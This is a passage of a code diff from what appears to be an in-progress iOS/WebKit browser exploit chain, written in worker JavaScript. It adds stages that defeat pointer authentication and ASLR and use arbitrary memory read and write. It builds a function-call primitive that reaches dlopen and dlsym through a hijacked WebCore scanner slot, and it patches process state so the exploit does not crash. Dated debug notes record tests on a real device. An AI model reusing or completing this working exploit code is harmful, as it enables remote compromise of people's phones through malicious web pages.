+            ['sec2', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage],
+            ['dlopen', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation],
+            ['dlsym', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata],
+            ['sign', offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif],
+        ];
+        postMessage(`[stage7] pre-setup slide=${hex(p.slide)} | ` + __G.map(([n, o]) => `${n}=${hex(p.read64(o))}->${hex(noPAC(p.read64(o)) - p.slide)}`).join(' '));
+    } catch (e) { postMessage(`[stage7] pre-setup LOG ERR ${e && (e.message || e)}`); }
+    await setupFcall();
+    if (!p.fcallReady) { postMessage('[stage7] ABORT: fcall not ready (setupFcall did not run?)'); return; }
+    const slow_dlopen = p.slow_dlopen, slow_dlsym = p.slow_dlsym;
+    // MARKER TEST (2026-08-02, real-device trigger debug): one raw fcall with pc=dlopen and a
+    // guaranteed-loadable path. If the detector scan reaches the softlink slot, the gadget loads
+    // x0=[scanner+0x28] (our path) and calls dlopen -> non-zero handle lands in OUR result slot
+    // (the poll resolves it). If the slot is never invoked, the sentinel survives and the poll
+    // times out -> 0xdeaddead. (signPointer was avoided: it hangs in the scan context.)
+    try {
+        const __mp = p.makeCString('/usr/lib/libSystem.B.dylib');
+        const __m = await p.slow_fcall_1(p.paciza_dlopen, __mp.ptr, 0n, 0n);
+        postMessage(`[stage7] MARKER TEST dlopen('/usr/lib/libSystem.B.dylib') result=${hex(__m)} ${(__m !== 0xdeaddeadn && __m !== 0n) ? '-> GADGET REACHED + dlopen OK' : (__m === 0xdeaddeadn ? '-> SLOT NEVER INVOKED (scan not reaching the gadget)' : '-> gadget reached but dlopen returned 0')}`);
+    } catch (e) { postMessage(`[stage7] MARKER TEST ERR ${e && (e.message || e)}`); }
 
     // --- fcall self-test: prove the primitive end-to-end with observable, pre-verified results ---
     // fcall self-test: prove the primitive end-to-end with observable, pre-verified results.
@@ -2175,18 +2580,38 @@ async function stage7() {
         __t0 = Date.now(); __tick = setInterval(() => postMessage(`[stage7] worker alive +${Date.now() - __t0}ms`), 100);
         const r = await slow_dlsym(webcore_handle, sym);
         clearInterval(__tick);
-        const unslid = (r & 0xffffffffffn) - p.slide;
+        const unslid = noPAC(r) - p.slide;
         const ok = unslid === want;
         __match = __match || ok;
         postMessage(`[stage7] slow_dlsym(${sym})=${hex(r)} unslid=${hex(unslid)} want=${hex(want)} -> ${ok ? 'MATCH' : 'no'} (+${Date.now() - __t0}ms)`);
         if (ok) break;
     }
     const malloc_sym = await slow_dlsym(malloc_handle, 'malloc');
-    const malloc_unslid = (malloc_sym & 0xffffffffffn) - p.slide;
+    const malloc_unslid = noPAC(malloc_sym) - p.slide;
     const malloc_ok = malloc_unslid === 0x18e532040n;   // T _malloc, nm-verified on 23B85
     postMessage(`[stage7] slow_dlsym(malloc)=${hex(malloc_sym)} unslid=${hex(malloc_unslid)} -> ${malloc_ok ? 'MATCH' : 'no'}`);
     const __ok = malloc_handle !== 0n && webcore_handle !== 0n && __match && malloc_ok;
     postMessage(`[stage7] fcall self-test ${__ok ? 'PASSED' : 'FAILED -- values above'}`);
+    // LATENT-BOMB DEFUSAL (2026-07-21, post-PASSED brks 230439.ips/230455.ips): worker1's gate
+    // block hangs in the Bambi analytics XPC and can complete SECONDS after the run ends (§5r);
+    // its dispatch_once completion asserts token==w1tok and brks the process on any other value.
+    // worker2's late completion is always legal (its w2tok seed persists; §5r) -- so once
+    // worker2's completion has fired (token==-1), re-seed w1tok&~3 so worker1's late completion
+    // also always finds its own port. If worker2 is still pending (token!=-1), KEEP its seed --
+    // worker2 earned the gate at stage6 and takes priority; worker1's bomb stays the rare
+    // residual (and the blocks' XPC latency is correlated, so when worker2 hangs, worker1
+    // usually hangs too and no completion fires at all).
+    try {
+        p.reestablishRead64();
+        const __tok = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
+        if (__tok === 0xffffffffffffffffn) {
+            const __w1 = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === 0x11111111n);
+            p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, BigInt(__w1.threadPort) & ~3n);
+            postMessage(`[stage7] defused worker1's latent gate bomb (token -1 -> w1tok seed)`);
+        } else {
+            postMessage(`[stage7] token=${hex(__tok)} (worker2 pending) -- keeping w2tok seed`);
+        }
+    } catch (e) { postMessage('[stage7] bomb-defusal ERR ' + (e && (e.message || e))); }
 }
 self.onmessage = async function (e) {
     try {
@@ -2245,12 +2670,42 @@ self.onmessage = async function (e) {
             case 'stage4': {
                 await stage4();
                 postMessage("trigger_dlopen_worker1");
+                p.workerParked = true;   // worker1 parks at its __cxa_atexit (stage4's 0x102 arm) -> atexitWake sites may land 0x101
+                // REGISTRATION-WAIT + IMMEDIATE SILENCE (2026-07-22, the dominant stall root): the
+                // moment worker1 registers (+0x100 on stage4's 0x102 arm), the word holds count>gen,
+                // so EVERY ambient __cxa_atexit unlock in the process drops to worker1 -- waking it
+                // BEFORE the stage5 metadata/vector writes land (~500ms later) -> its dlopen_from
+                // epilogue runs resize(0) on an unwritten forged vector -> garbage store -> attempt
+                // lost (CAS->drop->store cliff). Poll for the registration HERE (right after the
+                // trigger, ~0-400ms) and SILENCE the instant it shows: ambient unlocks then take the
+                // fast path (count==gen), worker1 stays asleep until the deliberate mapredir ARM.
+                // REGISTRATION-WAIT + IMMEDIATE SILENCE (2026-07-22, the dominant stall root): the
+                // moment worker1 registers (+0x100 on stage4's 0x102 arm), the word holds count>gen,
+                // so EVERY ambient __cxa_atexit unlock in the process drops to worker1 -- waking it
+                // BEFORE the stage5 metadata/vector writes land (~500ms later) -> its dlopen_from
+                // epilogue runs resize(0) on an unwritten forged vector -> garbage store -> attempt
+                // lost (CAS->drop->store cliff). (2026-07-23: the silence was REMOVED then RESTORED --
+                // removing it did NOT improve the wake, so it is not the orphaner; it still guards
+                // the early-wake cliff.) Poll for the registration HERE and SILENCE the instant it shows.
+                {
+                    const __A = p.offsets.libsystem_c__atexit_mutex + p.structs.Atexit_mutexState;
+                    let __w0 = 0;
+                    while ((p.read64(__A) & 0xffffff00n) < 0x200n) { if (++__w0 > 1000000) break; await spinYieldCool(__w0); }   // registration shows in 0-400ms when it works; 1M cool spins ~= 12s bound, cool enough to not cook the device
+                    // COUNT-MATCH (2026-07-23, lldb-proven): worker1's psynch wait is keyed to the word AT ITS
+                    // PARK (observed mgen=0x302 = count 3, gen 0 -- the ARM's fake 0x101 count=1 doesn't match
+                    // it -> the spare's drop advertises the wrong generation -> worker1 never wakes). Capture
+                    // the park word HERE (before the silence zeroes the count) so the stage5 ARM can arm with
+                    // worker1's ACTUAL count -> the spare's drop then advertises a matching generation.
+                    p.parkWord = p.read64(__A);
+                    atexitSilent();   // count==gen: ambient unlocks take the fast path -> no early drop to worker1
+                    postMessage(`[stage4] worker1 registration ${(p.read64(__A) & 0xffffff00n) >= 0x200n ? 'seen, silenced immediately' : 'NOT seen (may have sailed)'} after ${__w0} spins; parkWord=${hex(p.parkWord)}`);
+                }
                 break;
             }
             case 'stage5': {
                 // dlopen worker1 is triggered now
                 const __ok5 = await stage5();
-                if (__ok5 !== false) postMessage("trigger_dlopen_worker2");
+                if (__ok5 !== false) { postMessage("trigger_dlopen_worker2"); p.workerParked = true; }   // worker2 parks at stage6's hold
                 else postMessage("[stage5] worker2 NOT triggered -- worker1 still parked (seed left in place; no crash)");
                 break;
             }
@@ -2265,7 +2720,24 @@ self.onmessage = async function (e) {
                 break;
             }
             case 'slow_fcall_done': {
-                slow_fcall_resolve(p.slowFcallResult[0]);
+                // PROBE ONLY (2026-08-02): the promise now resolves via slow_fcall_1/2's POLL (the
+                // detector scan may run async and write the result after this message arrives), so do
+                // NOT resolve here. Log whether the sentinel was overwritten (gadget ran) or intact.
+                const __SENT = 0xfeedfacecafebeefn;
+                const __r = p.slowFcallResult ? p.slowFcallResult[0] : 0xdeaddeadn;
+                const __called = __r !== __SENT;
+                slog(`[sfd] slow_fcall_done received; resolve=${slow_fcall_resolve ? 'set (poll will take it)' : 'NULL'} result=${hex(__r)}${__called ? ' (gadget RAN)' : ' (SENTINEL INTACT -- poll will wait for the async scan)'}`);
+                try {
+                    if (p.invoker_x0 && p.slowFcallResult && p.gSecurityd) {
+                        slog(`[sfd] probe x0=${hex(p.invoker_x0[0x28 / 8])} x1=${hex(p.invoker_x0[0x30 / 8])} x2=${hex(p.invoker_x0[0x38 / 8])} resultPtr=${hex(p.invoker_x0[0x20 / 8])} result=${hex(__r)} pc=${hex(p.gSecurityd[0x80 / 8])} softlinkSlot=${hex(p.read64(p.offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray))} scannerObj=${hex(p.read64(p.offsets.WebCore__TND_scannerObject))} phoneScanner=${hex(p.read64(p.offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value))} tndFlag=${hex(p.read64(p.offsets.WebCore__TND_supportedFlag))} tndOnce=${hex(p.read64(p.offsets.WebCore__TND_scannerOnce))}`);
+                    }
+                } catch (e) { slog(`[sfd] probe ERR ${e && (e.message || e)}`); }
+                if (!__called) { try { armTelephoneGate('sfd-check', false, false); } catch (e) { } }   // sentinel intact -> dump the parsing-enabled gate state (was find() gated off?)
+                break;
+            }
+            case 'caption_done': {
+                // page finished the caption carrier (stage5 fcall bring-up); the chain polls the
+                // globals directly, so this is just a liveness ack -- nothing to do.
                 break;
             }
             case 'poll_locks': {
